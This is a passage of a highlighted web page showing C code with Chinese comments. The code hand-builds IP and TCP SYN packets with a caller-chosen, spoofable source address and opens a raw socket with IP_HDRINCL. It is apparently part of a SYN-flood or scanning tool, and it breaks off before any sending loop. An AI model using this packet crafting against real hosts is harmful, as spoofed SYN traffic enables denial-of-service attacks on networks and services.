</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">141
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">142
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">143
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">144
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">145
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">146
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">147
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">148
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">149
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">150
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">151
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">152
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">153
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">154
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">155
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">156
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">157
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">158
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">159
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">160
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">161
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">162
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">163
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">164
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">165
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">166
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">167
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">168
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">169
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">170
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">171
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">172
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">173
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">174
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">175
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">176
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">177
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">178
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">179
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">180
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">181
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">182
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">183
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">184
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">185
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">186
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">187
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">188
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">189
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">190
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">191
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">192
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">193
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">194
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">195
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">196
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">197
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">198
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">199
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">200
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">201
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">202
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">203
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">204
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">205
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">206
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">207
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">208
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">209
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">210
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">211
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">212
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">213
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">214
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">215
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">216
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">217
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">218
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">219
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">220
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;ctype.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;fcntl.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;signal.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/time.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/socket.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;string.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;netdb.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;errno.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;time.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;arpa/inet.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold"></span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">struct</span> iphdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       ver_and_hdrlen;<span style="color:#007f7f">// 版本号与IP头部长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       tos;           <span style="color:#007f7f">// 服务类型
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      total_len;     <span style="color:#007f7f">// 总长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      id;            <span style="color:#007f7f">// IP包ID
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      flags;         <span style="color:#007f7f">// 标志位(包括分片偏移量)
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       ttl;           <span style="color:#007f7f">// 生命周期
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       protocol;      <span style="color:#007f7f">// 上层协议
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      checksum;      <span style="color:#007f7f">// 校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        srcaddr;       <span style="color:#007f7f">// 源IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        dstaddr;       <span style="color:#007f7f">// 目标IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">struct</span> tcphdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      sport;    <span style="color:#007f7f">// 源端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      dport;    <span style="color:#007f7f">// 目标端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        seq;      <span style="color:#007f7f">// 序列号
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        ack_seq;  <span style="color:#007f7f">// 确认号
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       len;      <span style="color:#007f7f">// 首部长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       flag;     <span style="color:#007f7f">// 标志位
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      win;      <span style="color:#007f7f">// 窗口大小
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      checksum; <span style="color:#007f7f">// 校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      urg;      <span style="color:#007f7f">// 紧急指针
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">struct</span> pseudohdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        saddr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        daddr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span>                zeros;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span>                protocol;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      length;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> <span style="color:#fff;font-weight:bold">inline</span>
</span></span><span style="display:flex;"><span>checksum(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> *buffer, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">long</span> cksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">while</span> (size &gt; <span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        cksum += *buffer++;
</span></span><span style="display:flex;"><span>        size  -= <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (size) {
</span></span><span style="display:flex;"><span>        cksum += *(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> *)buffer;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cksum = (cksum &gt;&gt; <span style="color:#ff0;font-weight:bold">16</span>) + (cksum &amp; <span style="color:#ff0;font-weight:bold">0xffff</span>);
</span></span><span style="display:flex;"><span>    cksum += (cksum &gt;&gt; <span style="color:#ff0;font-weight:bold">16</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> (<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> )(~cksum);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">void</span> init_ip_header(<span style="color:#fff;font-weight:bold">struct</span> iphdr *ip, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> srcaddr,
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> dstaddr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> len = <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> iphdr) + <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ip-&gt;ver_and_hdrlen = (<span style="color:#ff0;font-weight:bold">4</span>&lt;&lt;<span style="color:#ff0;font-weight:bold">4</span> | <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> iphdr)/<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>));
</span></span><span style="display:flex;"><span>    ip-&gt;tos = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;total_len = htons(len);
</span></span><span style="display:flex;"><span>    ip-&gt;id = <span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;flags = <span style="color:#ff0;font-weight:bold">0x40</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;ttl = <span style="color:#ff0;font-weight:bold">255</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;protocol = IPPROTO_TCP;
</span></span><span style="display:flex;"><span>    ip-&gt;checksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;srcaddr = srcaddr; <span style="color:#007f7f">// 源IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    ip-&gt;dstaddr = dstaddr; <span style="color:#007f7f">// 目标IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">void</span> init_tcp_header(<span style="color:#fff;font-weight:bold">struct</span> tcphdr *tcp, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> dport)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    tcp-&gt;sport = htons(rand() % <span style="color:#ff0;font-weight:bold">16383</span> + <span style="color:#ff0;font-weight:bold">49152</span>);   <span style="color:#007f7f">// 随机生成一个端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;dport = htons(dport);                    <span style="color:#007f7f">// 目标端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;seq = htonl(rand() % <span style="color:#ff0;font-weight:bold">90000000</span> + <span style="color:#ff0;font-weight:bold">2345</span> );  <span style="color:#007f7f">// 随机生成一个初始化序列号
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;ack_seq = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;len = (<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr) / <span style="color:#ff0;font-weight:bold">4</span> &lt;&lt; <span style="color:#ff0;font-weight:bold">4</span> | <span style="color:#ff0;font-weight:bold">0</span>);
</span></span><span style="display:flex;"><span>    tcp-&gt;flag = <span style="color:#ff0;font-weight:bold">0x02</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;win = htons(<span style="color:#ff0;font-weight:bold">1024</span>);
</span></span><span style="display:flex;"><span>    tcp-&gt;checksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;urg = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">void</span> init_pseudo_header(<span style="color:#fff;font-weight:bold">struct</span> pseudohdr *pseudo, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> srcaddr,
</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> dstaddr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    pseudo-&gt;zeros = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    pseudo-&gt;protocol = IPPROTO_TCP;
</span></span><span style="display:flex;"><span>    pseudo-&gt;length = htons(<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr));
</span></span><span style="display:flex;"><span>    pseudo-&gt;saddr = srcaddr;
</span></span><span style="display:flex;"><span>    pseudo-&gt;daddr = dstaddr;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> make_syn_packet(<span style="color:#fff;font-weight:bold">char</span> *packet, <span style="color:#fff;font-weight:bold">int</span> pkt_len, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> daddr,<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> saddr,
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> dport)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span> buf[<span style="color:#ff0;font-weight:bold">100</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> len;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">struct</span> iphdr ip;          <span style="color:#007f7f">//IP 头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">struct</span> tcphdr tcp;        <span style="color:#007f7f">//TCP 头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">struct</span> pseudohdr pseudo;  <span style="color:#007f7f">//TCP 伪头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">//saddr = inet_addr(&#34;192.168.195.145&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>    len = <span style="color:#fff;font-weight:bold">sizeof</span>(ip) + <span style="color:#fff;font-weight:bold">sizeof</span>(tcp);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 初始化头部信息
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    init_ip_header(&amp;ip, saddr, daddr);
</span></span><span style="display:flex;"><span>    init_tcp_header(&amp;tcp, dport);
</span></span><span style="display:flex;"><span>    init_pseudo_header(&amp;pseudo, saddr, daddr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">//计算IP校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    ip.checksum = checksum((u_short *)&amp;ip, <span style="color:#fff;font-weight:bold">sizeof</span>(ip));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 计算TCP校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    bzero(buf, <span style="color:#fff;font-weight:bold">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    memcpy(buf , &amp;pseudo, <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo));           <span style="color:#007f7f">// 复制TCP伪头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    memcpy(buf + <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo), &amp;tcp, <span style="color:#fff;font-weight:bold">sizeof</span>(tcp)); <span style="color:#007f7f">// 复制TCP头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp.checksum = checksum((u_short *)buf, <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo) + <span style="color:#fff;font-weight:bold">sizeof</span>(tcp));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bzero(packet, pkt_len);
</span></span><span style="display:flex;"><span>    memcpy(packet, &amp;ip, <span style="color:#fff;font-weight:bold">sizeof</span>(ip));
</span></span><span style="display:flex;"><span>    memcpy(packet + <span style="color:#fff;font-weight:bold">sizeof</span>(ip), &amp;tcp, <span style="color:#fff;font-weight:bold">sizeof</span>(tcp));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> len;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> make_raw_socket()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> fd;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> on = <span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 创建一个原始套接字, 指定其关注TCP协议
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (fd == -<span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 设置需要手动构建IP头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (<span style="color:#fff;font-weight:bold">char</span> *)&amp;on, <span style="color:#fff;font-weight:bold">sizeof</span>(on)) &lt; <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>        close(fd);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> fd;
